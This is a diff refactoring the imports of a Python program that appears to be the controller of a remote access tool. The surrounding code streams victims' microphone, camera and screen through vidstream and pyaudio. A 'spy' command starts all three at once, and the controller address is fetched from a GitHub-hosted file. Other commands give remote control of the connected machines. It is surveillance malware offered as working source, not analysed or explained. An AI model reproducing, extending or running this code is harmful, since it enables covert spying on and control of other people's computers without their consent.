@@ -1,12 +1,12 @@
-import socket, time, os, sys, vidstream, pyaudio
+import socket, os, threading, requests, re
+from vidstream import StreamingServer
+from pyaudio import PyAudio, paInt16
+from time import sleep
 from numpy import array
 from math import *
-import fct
-import threading, requests, urllib
-from socketserver import ThreadingMixIn 
+from fct import clear as clearWindow
 from colored import fg, bg, attr
 from iteration_utilities import duplicates
-from functools import cache
 from github import Github
 def getSelfIp(temp=-1):
     return [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][temp]
@@ -60,8 +60,8 @@ class Microphone(threading.Thread):
                     break
                 pass
         if not self.close:
-            FORMAT, CHANNELS, RATE, CHUNK = pyaudio.paInt16, 1, 44100, 4096
-            audio = pyaudio.PyAudio()
+            FORMAT, CHANNELS, RATE, CHUNK = paInt16, 1, 44100, 4096
+            audio = PyAudio()
             stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)
             try:
                 while True:
@@ -116,7 +116,7 @@ class myThread(threading.Thread):
                     # print("error")
                     break
                 loop = 0
-            time.sleep(0.5)
+            sleep(0.5)
             try:
                 getAll.getID().index(self.ID)
             except:
@@ -136,7 +136,7 @@ class myThread(threading.Thread):
     def send(self, data):
         data.replace("9", "8+1")
         self.con.sendall(data.encode())
-        time.sleep(0.05)
+        sleep(0.05)
     def stop(self):
         self.Stop = True
     def getCon(self):
@@ -167,7 +167,7 @@ class myThread(threading.Thread):
     def screenStart(self, port):
         if not self.screen:
             self.screenPort = port
-            self.scrn = (vidstream.StreamingServer(requests.get(f"{githubUrl}ip").text.replace("\n", ""), port))
+            self.scrn = (StreamingServer(requests.get(f"{githubUrl}ip").text.replace("\n", ""), port))
             t = threading.Thread(target=self.scrn.start_server)
             t.daemon=True
             t.start()
@@ -182,7 +182,7 @@ class myThread(threading.Thread):
     def cameraStart(self, port):
         if not self.camera:
             self.cameraPort = port
-            self.cam = (vidstream.StreamingServer(requests.get(f"{githubUrl}ip").text.replace("\n", ""), port))
+            self.cam = (StreamingServer(requests.get(f"{githubUrl}ip").text.replace("\n", ""), port))
             t = threading.Thread(target=self.cam.start_server)
             t.daemon=True
             t.start()
@@ -352,7 +352,7 @@ def runThreadingSendAndReceive(data):
         t.daemon = True
         t.start()
         loop+=1
-    time.sleep(5)
+    sleep(5)
 
 def testIfIpTrue(data, total=False):
     if total == False:
@@ -363,10 +363,9 @@ def testIfIpTrue(data, total=False):
     if total != False:
         return testIfIpTrue(data) == True and len(data.split('.')) == 4
 def stopSpaceError(data):
-    import re
     return " ".join(re.split(r"\s+", (re.sub(r"^\s+|\s+$", "", data))))
 def clear():
-    fct.clear()
+    clearWindow()
 
 def restart(timeout=2):
     global mainThread
@@ -378,7 +377,7 @@ def restart(timeout=2):
             connexion.send('left'.encode())
         except:
             pass
-    time.sleep(timeout)
+    sleep(timeout)
     mainThread = threading.Thread(target=MainThread)
     mainThread.daemon = True
     mainThread.start()
@@ -645,15 +644,15 @@ def sendData(data):
             micStop(reload=True)
         elif data in ("spy"):
             sendData("startmic")
-            time.sleep(0.5)
+            sleep(0.5)
             sendData("cameraStart")
-            time.sleep(0.5)
+            sleep(0.5)
             sendData("screenStart")
         elif data in ('spyStop'):
             sendData("micStop")
-            time.sleep(0.5)
+            sleep(0.5)
             sendData("cameraStop")
-            time.sleep(0.5)
+            sleep(0.5)
             sendData("screenStop")
         elif datalist[0] in ("fasttap", "fastTap", "tapfast", "tapFast"):
             datalist.pop(0)
@@ -674,7 +673,7 @@ def sendData(data):
         elif datalist[0] in ("time", "sleep"):
             if not datalist[1]:
                 datalist.append(1)
-            time.sleep(int(datalist[1]))
+            sleep(int(datalist[1]))
         elif datalist[0] in ("fastcontrol"):
             Send = False
             datalist.pop(0)
